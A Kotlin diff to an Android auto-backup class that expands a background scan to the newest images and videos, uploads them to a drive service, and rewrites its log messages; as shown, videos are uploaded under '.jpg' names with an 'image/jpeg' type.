@@ -17,51 +17,67 @@ class AutoBackupManager(private val context: Context) {
         scope.launch {
             try {
                 val mediaUris = scanMedia()
-                Log.d("AutoBackup", "Found ${mediaUris.size} media files for automatic sync")
+                Log.d("AutoBackup", "SCAN_DEBUG: Detected ${mediaUris.size} media files total (Images + Videos)")
+
+                if (mediaUris.isEmpty()) {
+                    Log.w("AutoBackup", "SCAN_DEBUG: No media files found. Check permissions or device content.")
+                    return@launch
+                }
 
                 mediaUris.forEachIndexed { index, uri ->
-                    val name = "auto_sync_${System.currentTimeMillis()}_$index.jpg"
+                    val fileName = "auto_sync_${System.currentTimeMillis()}_$index.jpg"
                     try {
-                        val inputStream = context.contentResolver.openInputStream(uri)
-                        if (inputStream != null) {
-                            val fileId = driveService.uploadFile(name, inputStream, "image/jpeg")
+                        context.contentResolver.openInputStream(uri)?.use { inputStream ->
+                            val fileId = driveService.uploadFile(fileName, inputStream, "image/jpeg")
                             if (fileId != null) {
-                                Log.d("AutoBackup", "Successfully synced: $name (ID: $fileId)")
+                                Log.d("AutoBackup", "UPLOAD_SUCCESS: $fileName synced with ID: $fileId")
+                            } else {
+                                Log.e("AutoBackup", "UPLOAD_FAILED: Drive service returned null for $fileName")
                             }
                         }
                     } catch (e: Exception) {
-                        Log.e("AutoBackup", "Failed to sync file: $name", e)
+                        Log.e("AutoBackup", "CORE_ERROR: Failed to process URI: $uri", e)
                     }
                 }
-                Log.d("AutoBackup", "Automatic sync complete.")
+                Log.d("AutoBackup", "PROTOCOL_COMPLETE: All background sync operations finished.")
             } catch (e: Exception) {
-                Log.e("AutoBackup", "Error during automatic sync", e)
+                Log.e("AutoBackup", "FATAL_SYNC_ERROR: Background worker failed", e)
             }
         }
     }
 
     private fun scanMedia(): List<Uri> {
-        val uris = mutableListOf<Uri>()
-        val projection = arrayOf(MediaStore.Images.Media._ID)
-        try {
-            val cursor = context.contentResolver.query(
-                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                projection, null, null, null
-            )
-
-            cursor?.use {
-                val idColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
-                while (it.moveToNext()) {
-                    val id = it.getLong(idColumn)
-                    val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
-                    uris.add(contentUri)
-                    if (uris.size >= 10) break 
-                }
+        val allMedia = mutableListOf<Uri>()
+        
+        // 1. Scan Images
+        val imageProjection = arrayOf(MediaStore.Images.Media._ID)
+        context.contentResolver.query(
+            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+            imageProjection, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC"
+        )?.use { cursor ->
+            val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
+            while (cursor.moveToNext()) {
+                val id = cursor.getLong(idColumn)
+                allMedia.add(ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id))
+                if (allMedia.size >= 15) break // Limit for sync performance
             }
-        } catch (e: Exception) {
-            Log.e("AutoBackup", "Media scan failed", e)
         }
-        return uris
+
+        // 2. Scan Videos
+        val videoProjection = arrayOf(MediaStore.Video.Media._ID)
+        context.contentResolver.query(
+            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
+            videoProjection, null, null, "${MediaStore.Video.Media.DATE_ADDED} DESC"
+        )?.use { cursor ->
+            val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID)
+            while (cursor.moveToNext()) {
+                val id = cursor.getLong(idColumn)
+                allMedia.add(ContentUris.withAppendedId(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, id))
+                if (allMedia.size >= 30) break 
+            }
+        }
+
+        return allMedia
     }
 
     fun cancel() {
